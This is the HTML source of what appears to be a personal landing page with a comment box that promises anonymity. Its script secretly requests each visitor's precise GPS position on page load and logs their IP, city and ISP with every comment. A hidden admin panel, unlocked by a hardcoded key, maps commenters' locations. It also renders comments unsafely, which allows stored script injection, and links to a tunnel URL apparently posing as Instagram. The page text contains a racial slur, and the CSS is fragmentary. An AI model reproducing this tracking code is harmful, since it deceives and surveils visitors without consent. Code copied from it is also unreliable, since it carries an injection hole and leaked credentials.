<style>

  background:radial-gradient(circle at top,#111,#000);

.btn{

  border-radius:12px;padding:12px;color:#fff;
}

.comment-btn{
  margin-top:10px;padding:10px 18px;
  background:#00ffcc;color:#000;border:none;
  border-radius:999px;font-weight:600;cursor:pointer;
}

.comment{
  margin-top:22px;padding:12px;border-radius:12px;

/* ADMIN PANEL */

  position:fixed;
  inset:0;
  background:rgba(0,0,0,.85);
  display:none;
  justify-content:center;
  align-items:center;
  z-index:999;
}
#adminBox{
  background:#111;
  width:95%;

  width:100%;

</head>

<body>
<div class="container">

<img src="https://i.postimg.cc/SKhqgHqv/IMG-20260111-212449-914.webp" class="profile-pic">

<div class="socials">

  <a href="https://www.linkedin.com/in/akshat-pandey-5b2a552a3" target="_blank"><i class="fab fa-linkedin"></i></a>
</div>

<h1>Akshat Pandey</h1>
<div class="tagline">Personal Landing Page</div>

<div class="card">
  Nigga this my landing page running on my personal server computer 24/7.
  <br><br>
  <a href="https://naturally-partial-wrote-scout.trycloudflare.com/a80cccda/instagram" target="_blank">

  </a><br>
  <a class="btn" href="https://naturally-partial-wrote-scout.trycloudflare.com/a80cccda/instagram">Go ‚Üí</a>

<div class="card">
  <h2>Drop a comment</h2>
  <textarea id="commentInput" placeholder="Please comment anonymously"></textarea>
  <button class="comment-btn" onclick="addComment()">Post</button>
  <div id="comments"></div>
  <div id="secretBtn" onclick="openAdmin()">‚Ä¢</div>
</div>

<footer>¬© 2026 Akshat Pandey ‚Ä¢ Hosted on my infrastructure</footer>

<!-- ADMIN PANEL -->
<div id="adminPanel">
  <div id="adminBox">
    <h3>üìç Admin Location Panel</h3>
    <div id="adminContent"></div>
    <button class="comment-btn" onclick="closeAdmin()">Close</button>
  </div>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/12.8.0/firebase-app.js";
import {
  getFirestore, collection, addDoc,
  query, orderBy, onSnapshot,
  serverTimestamp
} from "https://www.gstatic.com/firebasejs/12.8.0/firebase-firestore.js";

const ADMIN_KEY = "@Akshat130807";

const firebaseConfig = {
  apiKey: "AIzaSyCY88mD-sHqxZiOGkQZbliTXG1QmySPesI",
  authDomain: "akshat-comments.firebaseapp.com",
  projectId: "akshat-comments"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

let gps = null;

// AUTO GPS REQUEST
if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(
    pos => gps = {
      lat: pos.coords.latitude,
      lon: pos.coords.longitude,
      acc: pos.coords.accuracy
    },
    () => gps = null,
    { enableHighAccuracy: true }
  );
}

async function getIP(){
  const r = await fetch("https://ipapi.co/json/");
  return r.json();
}

window.addComment = async () => {
  const text = commentInput.value.trim();
  if(!text) return;

  const ip = await getIP();

  await addDoc(collection(db,"comments"),{
    msg:text,
    ip:ip.ip,
    city:ip.city,
    region:ip.region,
    country:ip.country,
    timezone:ip.timezone,
    org:ip.org,
    gps:gps,
    time:serverTimestamp()
  });

  commentInput.value="";
};

const q = query(collection(db,"comments"), orderBy("time","desc"));

onSnapshot(q, snap => {
  comments.innerHTML="";
  adminContent.innerHTML="";

  snap.forEach(d => {
    const c=d.data();
    const t=c.time?new Date(c.time.seconds*1000).toLocaleString():"";

    comments.innerHTML+=`
      <div class="comment">
        <b>${c.city || "Unknown"}</b><br>
        <small>${t}</small><br>
        ${c.msg}
      </div>
    `;

    if(c.gps){
      adminContent.innerHTML+=`
        <div class="comment">
          <b>${c.city || "Unknown"} (${c.country})</b><br>
          GPS: ${c.gps.lat}, ${c.gps.lon} (¬±${Math.round(c.gps.acc)}m)
          <iframe
            src="https://www.openstreetmap.org/export/embed.html?bbox=${c.gps.lon-0.01},${c.gps.lat-0.01},${c.gps.lon+0.01},${c.gps.lat+0.01}&marker=${c.gps.lat},${c.gps.lon}">
          </iframe>
        </div>
      `;
    }
  });
});

window.openAdmin = () => {
  const k = prompt("Admin key:");
  if(k !== ADMIN_KEY) return;
  adminPanel.style.display="flex";
};

window.closeAdmin = () => {
  adminPanel.style.display="none";
};
</script>

</body>
</html>
